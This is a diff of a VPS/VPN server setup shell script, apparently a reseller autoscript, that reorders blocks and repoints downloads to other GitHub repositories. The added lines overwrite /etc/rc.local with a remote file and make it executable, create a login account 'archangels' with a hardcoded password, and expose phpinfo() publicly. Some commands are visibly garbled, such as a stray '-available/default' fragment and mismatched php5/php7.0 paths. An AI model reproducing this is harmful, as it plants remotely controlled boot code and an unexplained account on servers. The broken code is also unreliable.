@@ -126,24 +126,11 @@ wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/Autoscriptsabah
 mkdir -p /home/vps/public_html
 echo "<pre>Modified by Blackapache9</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/Autoscriptsabahan/isox/master/vps.conf"
-sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/Apache07/07script/master/007/vps.conf"
+sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 service php5-fpm restart
 service nginx restart
 
-# openvpn
-apt-get -y install openvpn
-wget -O /etc/openvpn/openvpn.tar "https://github.com/Apache07/07script/blob/master/07/openvpn.tar?raw=true"
-cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/rc.local "https://raw.githubusercontent.com/Apache07/07script/master/007/rc.local";chmod +x /etc/rc.local
-# etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/Apache07/07script/master/007/client.ovpn"
-sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-useradd -m -g users -s /bin/bash archangels
-echo "7C22C4ED" | chpasswd
-echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
-cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;-available/default
 # install badvpn
 wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/Autoscriptsabahan/isox/master/badvpn-udpgw"
 if [[ $OS == "x86_64" ]]; then
@@ -179,7 +166,14 @@ sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
 sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
 sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
 service ssh restart
-
+# openvpn
+apt-get -y install openvpn
+wget -O /etc/openvpn/openvpn.tar "https://github.com/Apache07/07script/blob/master/07/openvpn.tar?raw=true"
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "https://raw.githubusercontent.com/Apache07/07script/master/007/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/Apache07/07script/master/007/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
 # install dropbear
 #apt-get -y update
 apt-get -y install dropbear
@@ -191,7 +185,20 @@ echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
 service ssh restart
 service dropbear restart
-
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/Apache07/07script/master/007/client.ovpn"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;-available/default
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/Apache07/07script/master/007/nginx.conf"
+mkdir -p /home/vps/public_html
+echo "<pre>Setup by Dragon96 | telegram @BlackApache77 | whatsapp +60109475453</pre>" > /home/vps/public_html/index.php
+echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/Apache07/07script/master/007/vps.conf"
+sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 # upgrade dropbear 2014
 apt-get install zlib1g-dev
 wget https://matt.ucc.asn.au/dropbear/releases/dropbear-2012.55.tar.bz2
